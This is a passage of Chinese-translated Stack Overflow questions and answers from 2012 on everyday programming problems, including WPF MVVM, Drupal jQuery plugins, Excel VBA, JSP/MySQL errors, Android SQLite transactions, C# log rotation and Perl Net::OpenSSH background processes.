## 回答 #4

> 赞同：0
> 
> 时间：2012-11-18T15:51:30.210

如果您想绝对确定，您可以生成带有数字图像的 HTML 元素并将其放置到带有 的页面`display: none`，因此它已经加载并在页面上。

如果需要数字，您首先检查页面上的 HTML 元素并获取这个元素，将其设置为`display: block`或任何您需要的元素，然后用该元素替换当前的数字元素。

作为一些示例代码，我只是把它放在一起。

var digit_images = ["file/path/one.png", "file/path/two.png", "file/path/three.png", ...];

```
function giveMeTheDigit(digit)
{
    var img = digit_images[digit];
    var element = $("#digit_holder" + digit);

    if (element.length == 1)
    {
        $(".digit_holder").hide(); //hide the current holder
        element.show(); //show the new one
    }
    else
    {
        $('<div class="digit_holder" id="digit_holder' + digit + '"><img src="' + img + '" /></div>')
            .appendTo("#yourDestination");
    }
} 
```

此代码未经测试，但我想您知道我在追求什么，并且可以根据您的需要对其进行编辑。祝你好运！

# wpf - 使用 MVVM 在 WPF 应用程序中动态设置 UserControl

> ID：13418529
> 
> 赞同：2
> 
> 时间：2012-11-16T14:25:49.470
> 
> 标签：wpf, mvvm, dynamic-usercontrols

我正在创建一种基础 WPF 应用程序来托管 WPF 用户控件，它将出现在程序集中（稍后将是 AddIns）。应用程序和用户控件遵循 MVVM。不幸的是，我是 WPF 和 MVVM 的新手，所以我对特价商品不是很熟悉。我进行了很多搜索，但没有任何帮助（或者我不理解解决方案，这可能是可能的）。

所以我的应用程序包含用户控件的基本功能和一个分为菜单栏和用户控件占位符的窗口。这是我到目前为止所拥有的，有一个按钮可以选择 VersionControl 控件，它将在我加载用户控件的 MainWindow 的 viewModel 中调用一个函数，但我没有让它显示在 MainWindow 中。

```
<Grid DataContext="{StaticResource Windows1ViewModel}">
        <Grid.RowDefinitions>
            <RowDefinition Height="50" />
            <RowDefinition Height="*" />
        </Grid.RowDefinitions>
    <Canvas Grid.Row="0"                >
        <Button Content="VersionControl"
                Style="{StaticResource ButtonStyle1}"
                HorizontalAlignment="Center"
                Command="{Binding LoadVersionControl}" />
    </Canvas>
    <Canvas Grid.Row="1">
        <ItemsControl Name="ControlCanvas" />
    </Canvas>
</Grid> 
```

ViewModel 定义：

```
public ICommand LoadVersionControl { get { return new DelegateCommand(OnLoadVersionControl); } } 
```

但是我需要在 OnLoadVersionControl 函数中做什么？我有 VersionControlView 和 VersionControlViewModel，但不知道如何在我的应用程序中显示它。非常感谢您的帮助，

麦克风

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:35:42.800

我会使用 RelayCommand 和 ICommand 组合来绑定到 XAML。将以下内容放入您的 ViewModel 中，不要忘记设置 DataContext！

```
 // Execute method here
 private void LoadVersionControl(object param) {
      // do stuff here (if you are binding to same view Model for your MainWindow)
      //MainWindow.TextBoxInput.Visibility = Visibility.Visible
 }

 // Controls conditions to allow command execution
 private bool LoadVersionControlCanExecute(object param) { return true; }

 // Relay Command for method
 public RelayCommand _LoadVersionControl;

 // Property for binding to XAML
 public ICommand LoadVersionControlCommand {
      get {
           if(_LoadVersionControl == null) {
                _LoadVersionControl = new RelayCommand(LoadVersionControl, LoadVersionControlCanExecute);
           }

           return _LoadVersionControlCommand;
      }
 } 
```

# php - 使用 Drupal 7 实现 tabslideout

> ID：13418533
> 
> 赞同：1
> 
> 时间：2012-11-16T14:25:59.087
> 
> 标签：php, jquery, tabs, slide

我正在尝试将 jquery 插件 tabslideout 添加到我的 Drupal 7 站点（主题已经解释过很多次了，我将[这个示例](https://stackoverflow.com/questions/9300258/adding-tabslideout-javascript-to-drupal-7)用于 Drupal 7，但它在我的站点上不起作用。我是一个绝对的菜鸟，我不能了解一下php，似乎我无法使该功能正常工作。

首先，我在 .info 文件中添加了脚本。

接下来，我将以下代码添加到我的页面--front.tpl.php 文件中：

```
<script type="text/javascript">
$(function(){
$('.slide-out-div').tabSlideOut({
    tabHandle: '.handle',                     //class of the element that will become your tab
    pathToTabImage: 'sites/all/themes/temp3/images/contact_tab.gif', //path to the image for the tab //Optionally can be set using css
    imageHeight: '122px',                     //height of tab image               //Optionally can be set using css
    imageWidth: '40px',                       //width of tab image            //Optionally can be set using css
    tabLocation: 'left',                      //side of screen where tab lives, top, right, bottom, or left
    speed: 300,                               //speed of animation
    action: 'click',                          //options: 'click' or 'hover', action to trigger animation
    topPos: '200px',                          //position from the top/ use if tabLocation is left or right
    leftPos: '20px',                          //position from left/ use if tabLocation is bottom or top
    fixedPosition: false                      //options: true makes it stick(fixed position) on scroll
});
});
</script> 
```

再往下：

```
<div class="slide-out-div">
<a class="handle" href="http://link-for-non-js-users.html">Content</a>
<h3>Contact me</h3>
<p>Thanks for checking out my jQuery plugin, I hope you find this useful.
</p>
<p>This can be a form to submit feedback, or contact info</p>
</div> 
```

而且，我添加了 CSS

```
.slide-out-div {
padding: 20px;
width: 250px;
background: #ccc;
border: 1px solid #29216d;
} 
```

只有 div 显示在页面上...

我也找到了这段代码，不幸的是它也不能正常工作。

```
<script type="text/javascript">
(function($) {
Drupal.behaviors.tabslideout = {
    attach: function() {
$('.slide-out-div').tabSlideOut {
    tabHandle: '.handle',                     //class of the element that will become your tab
    pathToTabImage: 'sites/all/modules/tabslideout/images/contact_tab.gif', //path to the image for the tab //Optionally can be set using css
    imageHeight: '122px',                     //height of tab image           //Optionally can be set using css
    imageWidth: '40px',                       //width of tab image            //Optionally can be set using css
    tabLocation: 'left',                      //side of screen where tab lives, top, right, bottom, or left
    speed: 300,                               //speed of animation
    action: 'click',                          //options: 'click' or 'hover', action to trigger animation
    topPos: '200px',                          //position from the top/ use if tabLocation is left or right
    leftPos: '20px',                          //position from left/ use if tabLocation is bottom or top
    fixedPosition: true                     //options: true makes it stick(fixed position) on scroll
};.next().hide();
};
 };
  })(jQuery);

</script> 
```

我想肯定有一些我以前没有想到的完全不同的东西，因为我根本不知道，这让专家大笑起来；）同一页面包含一个“flexslider”元素。

//////////// 非常感谢您的任何评论/建议！////////////////////

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T19:33:03.720

尝试更换

```
<script type="text/javascript">
(function($) {
Drupal.behaviors.tabslideout = {
    attach: function() {
$('.slide-out-div').tabSlideOut {
tabHandle: '.handle',                     //class of the element that will become your tab
pathToTabImage: 'sites/all/modules/tabslideout/images/contact_tab.gif', //path to the image for the tab //Optionally can be set using css
imageHeight: '122px',                     //height of tab image           //Optionally can be set using css
imageWidth: '40px',                       //width of tab image            //Optionally can be set using css
tabLocation: 'left',                      //side of screen where tab lives, top, right, bottom, or left
speed: 300,                               //speed of animation
action: 'click',                          //options: 'click' or 'hover', action to trigger animation
topPos: '200px',                          //position from the top/ use if tabLocation is left or right
leftPos: '20px',                          //position from left/ use if tabLocation is bottom or top
fixedPosition: true                     //options: true makes it stick(fixed position) on scroll
};.next().hide();
};
};
  })(jQuery);

</script> 
```

和

```
<script type="text/javascript">
$(function(){
$('.slide-out-div').tabSlideOut {
    tabHandle: '.handle',                     //class of the element that will become your tab
    pathToTabImage: 'sites/all/modules/tabslideout/images/contact_tab.gif', //path to the image for the tab //Optionally can be set using css
    imageHeight: '122px',                     //height of tab image           //Optionally can be set using css
    imageWidth: '40px',                       //width of tab image            //Optionally can be set using css
    tabLocation: 'left',                      //side of screen where tab lives, top, right, bottom, or left
    speed: 300,                               //speed of animation
    action: 'click',                          //options: 'click' or 'hover', action to trigger animation
    topPos: '200px',                          //position from the top/ use if tabLocation is left or right
    leftPos: '20px',                          //position from left/ use if tabLocation is bottom or top
    fixedPosition: true                     //options: true makes it stick(fixed position) on scroll
};
};

</script> 
```

正如网站所描述的那样

如果这不起作用，请尝试删除 .next().hide();

干杯。

# excel - 每次运行代码时，循环应该从第二张纸的第一列开始

> ID：13418540
> 
> 赞同：0
> 
> 时间：2012-11-16T14:26:22.117
> 
> 标签：excel, excel-2010, vba

每次我运行下面的代码时，它应该首先将 Import_R 表中的第一列粘贴到 Organise_R 表中的第一列。然而，由于某种原因，每次我启动它时，代码都会粘贴到 Organise_R 中上一次运行停止的列中。我需要以某种方式告诉代码始终从organise_R 表的第一列开始。我试图将 b 定义为 1 但显然与第 4 行冲突？请帮忙！

```
For a = 1 To 60

If Application.WorksheetFunction.CountA(Excel.Sheets("Import_R").Columns(a)) > 0 Then

    Excel.Sheets("Import_R").Columns(a).Copy

   b = Excel.Sheets("Organise_R").UsedRange.Columns.Count

    Excel.Sheets("Organise_R").Select

    If Application.WorksheetFunction.CountA(Excel.Sheets("Organise_R").Columns(b)) > 0 Then b = b + 1

        Excel.Sheets("Organise_R").Columns(b).EntireColumn.Select
        Excel.ActiveSheet.Paste

        Excel.Application.CutCopyMode = False
        Selection.TextToColumns Destination:=Cells(1, b), DataType:=xlDelimited, _
                TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=True, Tab:=False, _
                Semicolon:=False, Comma:=False, Space:=True, Other:=False, FieldInfo _
                :=Array(Array(1, 1), Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), _
                Array(7, 1), Array(8, 1)), TrailingMinusNumbers:=True

End If

Next a 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T16:42:20.770

如果代码总是应该从“Organize_R”的第一列开始，那么为什么要使用下面的代码？

```
b = Excel.Sheets("Organise_R").UsedRange.Columns.Count 
```

为什么不

```
Excel.Sheets("Organise_R").ClearContents
b = 1 
```

?

# mysql - tomcat jsp mySql 创建表错误

> ID：13418551
> 
> 赞同：0
> 
> 时间：2012-11-16T14:27:04.333
> 
> 标签：mysql, jsp, tomcat

我在连接到 mySql 和创建表等时遇到问题...

WEB_ING/lib：javax.servlet.jsp.jstl-1.2.1 javax.servlet.jsp.jstl-api-1.2.1 mysql-connector-java-5.1.22-bin

我（我总是得到这个堆栈跟踪/错误：

```
org.apache.jasper.JasperException: An exception occurred processing JSP page /hallo.jsp at line 38

35:  String QueryString = "CREATE TABLE RandomData ( id integer, birth_date date, salary integer, name char(10))";
36: 
37: 
38:              int result = stmt.executeUpdate("CREATE TABLE RandomData ( id integer, birth_date date, salary integer, name char(10))");
39: 
40:             System.out.println(result);
41: 

Stacktrace:
    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:568)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
root cause

java.lang.NullPointerException
    org.apache.jsp.hallo_jsp._jspService(hallo_jsp.java:103)
    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
```

这是我的代码：

```
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %>
<%@taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql" %>

    <%@page import="java.util.*"%>
    <%@page import="java.sql.*"%>
    <%@ page import="java.io.*" %>

    <%
        int rows = 1000;
        int comn = 1000;

        Class.forName("com.mysql.jdbc.Driver").newInstance();

        Connection con = null;
        ResultSet rst = null;
        Statement stmt = null;

        try{

        String url = "jdbc:mysql://BERTMAC-PC:3306/eDocs";
        con = DriverManager.getConnection(url,"enternet","enternet");
        stmt = con.createStatement();

        }catch(Exception e){
        e.printStackTrace(new PrintWriter(out));
        System.out.println(e.getMessage());
        }

             int result = stmt.executeUpdate("CREATE TABLE RandomData ( id integer, birth_date date, salary integer, name char(10))");

            System.out.println(result);

   rst.close();
   stmt.close();
   con.close();

    %> 
```

谢谢您的帮助

# jquery-mobile - 何时在使用 marionette 和 jquery mobile 构建的 Web 应用程序中调用 trigger('create')

> ID：13418553
> 
> 赞同：1
> 
> 时间：2012-11-16T14:27:27.403
> 
> 标签：jquery-mobile, marionette, singlepage

我正在使用 Marionette 和 jQuery Mobile 构建单页应用程序。页面的各个部分由填充了来自 Web SQL 的数据的模板组成。

我在 JQM 的文档中读到，应该使用强制 JQM 增强动态创建的页面 trigger('create')。这些示例表明，应该在注入新标记后立即调用触发器，如下所示：

```
$( ...new markup that contains widgets... ).appendTo( ".ui-page" ).trigger( "create" ); 
```

在我的例子中，标记是由 Marionette 注入的（即集合视图循环通过其关联的模型，每次都应用适当的模板。所以——这就是问题——我应该在哪个事件上绑定 trigger('create')使动态标记看起来增强？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T06:53:22.313

仅供参考，事实证明，当前版本的 Marionette (v1.0.0-beta5) 在将视图的内容添加到 DOM*后*似乎不会触发事件（请参阅[此处](https://github.com/marionettejs/backbone.marionette/issues/214#issuecomment-9752763)）。一种解决方法是让使用视图的代码——并且知道它刚刚将视图的内容添加到 DOM——来自己完成工作。这可能不是很好（例如，视图不能处理自己的事务）但它可以工作。更多信息可以在[这里](http://lostechies.com/derickbailey/2012/02/20/using-jquery-plugins-and-ui-controls-with-backbone/)找到。

# django - 插入新权限时触发操作

> ID：13418556
> 
> 赞同：0
> 
> 时间：2012-11-16T14:27:30.353
> 
> 标签：django

我通过 Meta Class 定义了我的自定义权限

```
class Meta:
permissions = (
        ("my_permission", "My Permission"),
   ) 
```

插入新权限时如何触发操作？

例如，如果我添加一个名为 my_permission_2 的新权限，我想调用一个 API。

我可以覆盖保存方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:02:36.790

您可以通过覆盖 save 方法来做到这一点。但是继续前进的方法是使用 Django Signals。使用它们非常容易。

例如，

```
#When you try to add a new permission to a model
user.permissions.add(<new_permission>)

#This callback function would be invoked based on what event you want to fire it
@receiver(post_add, <Model_name>)
def callback(*args, **kwargs):

... 
```

有各种各样的活动可供选择。看看[这里](https://docs.djangoproject.com/en/dev/ref/signals/)

# batch-file - 写一个批处理文件找到一个.exe文件并导出为.txt

> ID：13418568
> 
> 赞同：0
> 
> 时间：2012-11-16T14:28:21.630
> 
> 标签：batch-file

我需要一个批处理文件来搜索计算机中的`.exe`文件并将结果导出到`.txt`文件中。我希望计算机名称出现在`.txt`文件中，并让文件说明它是否`.exe`位于该计算机上。看看我到目前为止所拥有的。好像找`.docx`文件没问题。

我究竟做错了什么？

```
@echo off
If exist c:\filename.exe echo %COMPUTERNAME% yes >> \\servername\location\test.txt
If NOT exist c:\filename.exe echo %COMPUTERNAME% no >> \\servername\location\test.txt 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T19:46:49.567

是否要在当前计算机的*所有文件夹中搜索给定的 .exe 文件？*下面的批处理文件使用了一个小技巧：它假定 .exe 文件位于 PATH 变量的文件夹之一中（通常会发生），因此搜索是立即的：

```
@echo off
for %%a in (filename.exe) do set filePath=%%~$PATH:a
if defined filePath echo %COMPUTERNAME% yes >> \\servername\location\test.txt
if NOT defined filePath echo %COMPUTERNAME% no >> \\servername\location\test.txt 
```

**编辑：** *添加了整个磁盘的新版本*

```
@echo off
set filePath=
for /R C:\ /D %%a in (*) do if exist "%%a\filename.exe" set filePath=%%a& goto continue
:continue
if defined filePath echo %COMPUTERNAME% yes >> \\servername\location\test.txt
if NOT defined filePath echo %COMPUTERNAME% no >> \\servername\location\test.txt 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-10-12T01:37:20.723

尝试以下脚本：

```
Echo OFF
dir G:\XX in (*.*) /b > peru.txt 
```

# android - Android sqlite begintransaction 执行时间过长

> ID：13418569
> 
> 赞同：4
> 
> 时间：2012-11-16T14:28:25.797
> 
> 标签：android, sqlite, android-sqlite

我想将从 json 解析的数据批量插入到 db 中。我使用下面的方法插入批处理。问题是 mDbWritable.beginTransaction(); 执行时间太长。通常像 6 秒！不知道哪里有问题。一些想法是什么导致这么长的执行时间？非常感谢。

```
@Override
public ContentProviderResult[] applyBatch(ArrayList<ContentProviderOperation> operations)
        throws OperationApplicationException {
    long start = System.currentTimeMillis();
    mDbWritable.beginTransaction();
    long time = System.currentTimeMillis() - start;
    Alog.i(TAG, "Time applyBatch beginTransaction: " + time);

    final int numOperations = operations.size();
    final ContentProviderResult[] results = new ContentProviderResult[numOperations];
    try {
        for (int i = 0; i < numOperations; i++) {
            results[i] = operations.get(i).apply(this, results, i);
        }

        mDbWritable.setTransactionSuccessful();

    } finally {
        mDbWritable.endTransaction();
    }
    return results;
} 
```

日志中的一些示例：

```
11-16 15:14:53.726: I/ApiProvider(21442): Time applyBatch beginTransaction: 6025
11-16 15:15:00.713: I/ApiProvider(21442): Time applyBatch beginTransaction: 4940
11-16 15:15:17.819: I/ApiProvider(21442): Time applyBatch beginTransaction: 8651
11-16 15:15:45.346: I/ApiProvider(21442): Time applyBatch beginTransaction: 12672
11-16 15:16:16.807: I/ApiProvider(21442): Time applyBatch beginTransaction: 12411
11-16 15:16:45.685: I/ApiProvider(21442): Time applyBatch beginTransaction: 12247
11-16 15:17:01.500: I/ApiProvider(21442): Time applyBatch beginTransaction: 12788 
```

编辑：解析 json 时，我在循环中使用应用批处理。例如，对于 json 中的每个项目 - 解析并应用批处理。批处理包含插入、更新、删除操作。

这是我如何迭代和调用 applyBatch 的代码

```
Cursor starredChannelsCursor =
        mContentResolver.query(ApiContract.Channels.CONTENT_URI,
                               new String[] {BaseColumns._ID, ChannelsTable.ID, ChannelsTable.SLUG },
                               ChannelsTable.IS_STARRED + "=?",new String[] { "1" }, null);

String userName = mSettings.getUserName();

if (starredChannelsCursor != null && starredChannelsCursor.moveToFirst()) {     
    while (!starredChannelsCursor.isAfterLast()) {
        String channelSlug = starredChannelsCursor.getString(2);
        ChannelHandler channelHandler = new ChannelHandler(this);
        URI channelApiUri = Constants.getChannelApiURI(channelSlug,userName);
        //execute update make applybatch call
        executeUpdate(channelApiUri, channelHandler);

        starredChannelsCursor.moveToNext();
    }
}

if (starredChannelsCursor != null) {
    starredChannelsCursor.close();
}

/**
* Make call to Uri, parse response and apply batch operations to
* contentResolver
* 
* @param apiUri
* @param handler
*            - handles parsing
*/
private boolean executeUpdate(URI apiUri, AbstractJSONHandler handler) {
    ApiResponse apiResponse = mHttpHelper.doHttpCall(apiUri);

    ArrayList<ContentProviderOperation> batch =
                    new ArrayList<ContentProviderOperation>();

    if (apiResponse != null) {
        batch = handler.parse(apiResponse);
        Alog.v(TAG, "update user data from " + apiUri);
    }

    if (batch.size() > 0) {
        try {
            mContentResolver.applyBatch(ApiContract.CONTENT_AUTHORITY, batch);
        } catch (Exception e) {
            Alog.v(TAG, "Error: " + e.getMessage());
        }
    }
    return true;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T15:40:51.653

唯一可能出现的问题是，不同的线程在调用时获取相同的锁`beginTransaction()`并浪费时间等待其他线程释放锁。查看您的代码，了解您如何管理线程以及从哪些线程调用`applyBatch(..)`方法。

`beginTransaction()`查看at[`SQLiteDatabase`](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/2.3.3_r1/android/database/sqlite/SQLiteDatabase.java/)类的调用层次结构可能对您也很有用。

# math - 如何将离散变量转换为连续变量以用作 NN 输入？

> ID：13418573
> 
> 赞同：0
> 
> 时间：2012-11-16T14:28:43.533
> 
> 标签：math, statistics, neural-network

我有一些离散变量我想将它们转换为连续变量以用作神经网络的输入有人知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:57:04.907

它会产生大量输入特征，但您可以为离散变量的每个*状态使用指示符输入（0 或 1）。*从技术上讲，您可以为给定变量删除其中一个输入，因为它相当于所有其他输入都为零。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T05:25:51.550

将离散值缩放到 0 和 1 之间（或者更确切地说，0.1 和 0.9 以获得更好的数值行为）对您的应用程序有用吗？

# c# - 日志文件轮换 IOException

> ID：13418574
> 
> 赞同：2
> 
> 时间：2012-11-16T14:28:47.090
> 
> 标签：c#, .net, file, logging, file-io

我有一个看起来像这样的日志文件轮换函数：

```
 private static void RotateLogs()
    {
        FileInfo LogFile = new FileInfo(@"C:\temp\dataTransferErrorLog.txt");

        if (LogFile.Exists && (LogFile.Length) >= 10 * 1048576)
        {
            Compress(LogFile);
            LogFile.Delete();
            File.Create(@"C:\temp\dataTransferErrorLog.txt");
        }
    }

    private static void Compress(FileInfo fi)
    {
        // Get the stream of the source file.
        using (FileStream inFile = fi.OpenRead())
        {
            // Prevent compressing hidden and 
            // already compressed files.
            if ((File.GetAttributes(fi.FullName)
                & FileAttributes.Hidden)
                != FileAttributes.Hidden & fi.Extension != ".gz")
            {
                string destFileName = fi.FullName.Substring(0, fi.FullName.LastIndexOf('.')) + System.DateTime.Now.ToString("yyyyMMddHHmm") + fi.FullName.Substring(fi.FullName.LastIndexOf('.')) + ".gz";
                // Create the compressed file.
                using (FileStream outFile =
                            File.Create(destFileName))
                {
                    using (GZipStream Compress =
                        new GZipStream(outFile,
                        CompressionMode.Compress))
                    {
                        // Copy the source file into 
                        // the compression stream.
                        inFile.CopyTo(Compress);
                    }
                }
            }
        }
    } 
```

任何时候尝试轮换日志文件时都会引发 IOException。我*认为*它在尝试写入 .gz 文件时会引发异常，但我不确定。这是堆栈跟踪：

```
Framework Version: v4.0.30319
Description: The process was terminated due to an unhandled exception.
Exception Info: System.IO.IOException
Stack:
   at System.IO.__Error.WinIOError(Int32, System.String)
   at System.IO.FileStream.Init(System.String, System.IO.FileMode, System.IO.FileAccess, Int32, Boolean, System.IO.FileShare, Int32, System.IO.FileOptions, SECURITY_ATTRIBUTES, System.String, Boolean, Boolean)
   at System.IO.FileStream..ctor(System.String, System.IO.FileMode, System.IO.FileAccess, System.IO.FileShare, Int32, System.IO.FileOptions)
   at System.IO.StreamWriter.CreateFile(System.String, Boolean)
   at System.IO.StreamWriter..ctor(System.String, Boolean, System.Text.Encoding, Int32)
   at System.IO.StreamWriter..ctor(System.String, Boolean)
   at System.IO.File.AppendText(System.String)
   at XRayDataTransferService.XRayDataTransferService.LogMessage(System.String)
   at XRayDataTransferService.XRayDataTransferService.RunAgent()
   at System.Threading.ThreadHelper.ThreadStart_Context(System.Object)
   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)
   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)
   at System.Threading.ThreadHelper.ThreadStart() 
```

有人可以确认它在尝试将压缩信息写入 .gz 文件时抛出异常，并告诉我导致它抛出异常的情况如何？

编辑

这是 LogMessage 函数。大多数情况下，这有效，唯一一次抛出异常是在轮换日志时。

```
static void LogMessage(string messageText)
    {
        string ErrorLogFileName = @"C:\temp\dataTransferErrorLog.txt";

        using (StreamWriter Log = File.AppendText(ErrorLogFileName))
        {
            try
            {
                Log.WriteLine("{0}: {1}", dateStamp, messageText);
            }
            catch { }
        }
    } 
```

更新：

```
static void RunAgent()
    {
        while (!shutdown)
        {
            LogMessage("Starting data transfer...");
            errors = 0;

           // Do some data processing

            LogMessage("Finished running with " + errors.ToString() + " error(s).");

            RotateLogs();
        }
        shutdownSignal.Set();
    } 
```

我已经在下面的评论中说明了，但很明显，只有一个线程在运行。这是一项服务，因此它必须位于单独的线程中，但只有一个线程在运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:09:52.730

**编辑：**根据您的评论，我已经尝试了您的代码并发现了您遇到的问题。当您调用此行时`File.Create(@"C:\temp\dataTransferErrorLog.txt");`，它会返回`FileStream`永远不会关闭的。因此，您可以使用两种方法。首先是您需要将其分配`FileStream`给一个变量并显式调用`Close()`类似`FileStream`：

```
if (!LogFile.Exists)
{
        Compress(LogFile);
        LogFile.Delete();
        FileStream fs = File.Create(@"C:\Users\On\Documents\dataTransferErrorLog.txt");
        fs.Close();
} 
```

或者更好的方法是甚至不在那里创建文件，因为稍后调用`File.AppendText()`将创建它不存在的文件。所以我建议你把你的方法做成`RotateLogs`这样：

```
private static void RotateLogs()
{
    FileInfo LogFile = new FileInfo(@"C:\temp\dataTransferErrorLog.txt");

    if (LogFile.Exists && (LogFile.Length) >= 10 * 1048576)
    {
         Compress(LogFile);
         LogFile.Delete();
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:38:36.420

从您的堆栈跟踪中，此代码中没有发生异常。在您`LogMessage`正在调用的函数中`AppendText`，这就是它失败的地方。在代码顶部（主应用程序入口点）添加异常处理程序并登录（如直接写入文本文件或写入控制台，没有花哨的日志记录，只需获取数据），异常的详细信息将给出你更多的信息。

作为第二个建议，`log4net`是一个非常有用的日志库。它内置了一个滚动文件附加程序。它易于配置和设置，并可通过`NuGet`. 您可能要考虑使用它。很多产品都可以。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:34:16.743

将您的 pdb 与您的程序集一起部署，您将在堆栈跟踪中获得行号，这将使您能够查明引发异常的位置。你会生成 pdbs 不是吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:34:42.583

它不在旋转功能中。对我来说，看起来你正在轮换，同时你想追加到文件（写日志）所以它崩溃了。

但是发布异常消息，这将清除所有内容

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-16T14:49:00.770

我认为你正试图用一个线程在你的日志中写一些东西，而另一个线程正试图旋转日志......

更改您的代码就足够了，以便更好地了解正在发生的事情

```
static void LogMessage(string messageText)
{
    try
    {
        string ErrorLogFileName = @"C:\temp\dataTransferErrorLog.txt";

        using (StreamWriter Log = File.AppendText(ErrorLogFileName))
        {
            Log.WriteLine("{0}: {1}", dateStamp, messageText);
        }
     }
     catch(Exception) { throw; }
} 
```

无论如何，您最好的选择是使用强大的日志库作为 log4net 或 NLog。

他们的工作做得很好

# perl - 如何使用 perl 和 Net::OpenSSH 在远程机器上启动后台进程？

> ID：13418578
> 
> 赞同：2
> 
> 时间：2012-11-16T14:28:55.483
> 
> 标签：perl, background-process, remote-access, cpan, openssh

我正在尝试使用`Net::OpenSSH`登录到远程机器，并启动后台进程。

```
my $ssh = Net::OpenSSH->new( $username . "\@" . $host, key_path => $key, async => 1);

$ssh->error and die "Open ssh error: " . $ssh->error;

my $out = $ssh->system("nohup ./apache-jmeter-2.8/bin/jmeter-server > /dev/null &");

print $out; 
```

当它运行时，它会登录到机器上，我会得到 jmeter-server 提示符
——如果我输入 ctrl-C，则 perl 脚本会继续，并且 jmeter-server 进程会正确启动。

我已经尝试过`Net::OpenSSH->new()`使用和不使用**异步**参数的调用，并且我也尝试过在命令上使用**nohup**，没有任何区别。

如何消除对脚本的需要，`ctrl-c`以便脚本可以无人值守运行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:59:15.360

根据[Net::OpenSSH 手册](https://metacpan.org/module/Net%3a%3aOpenSSH)，您希望将 async => 1 标志提供给 system() 调用。

new() 调用上的 async => 1 没有做你认为它可能做的事情

# javascript - 强制一个 div 到容器内另一个 div 的顶部

> ID：13418583
> 
> 赞同：0
> 
> 时间：2012-11-16T14:29:02.590
> 
> 标签：javascript, html, css

可能是一个非常简单的问题，但我已经厌倦了试图自己实现这个问题。问题是我正在使用来自我们的软件产品的预先生成的 html 代码，因此不能只在 html 中将一个 div 移到另一个 div 之上。因此，我必须在 css 中完成。

```
 <div class="job_description">
    <h1>Web Developer (.Net/Mobile)</h1>
    <div class="job_summary">
       <p>
     Some text here
    <br>
    <br>
     Some text here
       </p>
    </div>

    <div class="job_classifications">
        <div class="classification x_location">
           <div class="class_type">Location</div>
           <div id="location" class="class_value"> London</div>
        </div>

         <div class="classification refno">
           <div class="class_type">Ref No</div>
           <div class="class_value">80</div>
        </div>
  </div> 
```

基本上，我希望 job_classifications 出现在 job_summary 上方。然后在 job_classifications 中，我需要将每个不同的分类以网格格式一起显示。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:49:57.053

像这样的东西可能会起作用，尽管它可能需要根据内容的外观进行一些调整。使用 jQuery：

`$(".job_classifications").prependTo(".job_summary");`

这是一个示例[http://jsbin.com/aqukez/1/edit](http://jsbin.com/aqukez/1/edit)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:49:39.363

将父 job_description 定位为相对，将子级定位为绝对应该会产生您正在寻找的效果。

这种方法的要点是针对最近的定位父定位位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:52:18.383

[http://jsfiddle.net/TxgKH/3/](http://jsfiddle.net/TxgKH/3/)

您可以使用

```
.job_description {
   display: table;
   caption-side: bottom;
}
.job_summary {
   display: table-caption;
} 
```

并为旧的 ie 定位绝对 + js 后备。

你可以做这样的事情 :) 对于低于 7 的 ie，有一个 js 后备。

# jquery - 将 attr 分配给 Jquery 变量

> ID：13418585
> 
> 赞同：0
> 
> 时间：2012-11-16T14:29:15.853
> 
> 标签：jquery, variable-assignment, attr

我在这里有一段代码，我打算用它来检测哪些部分已经可见，以帮助我正在研究的导航系统但是当我尝试获取可见性属性时，我无法获得回报。任何帮助是极大的赞赏。

```
 if(method === 'test'){
    console.log('Test Function Firing')
    var testvar = $('div#home').attr("visibility");
    if(testvar === 'visible'){
        console.log('Working')
    }
    else{console.log('Not Working')
        console.log(testvar);
        console.log("Log of call to "+$('div#home').attr("visibility"));
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:30:48.550

`visibility`不是属性，它是[CSS 属性](https://developer.mozilla.org/en-US/docs/CSS/visibility)。

改用`.css()`：

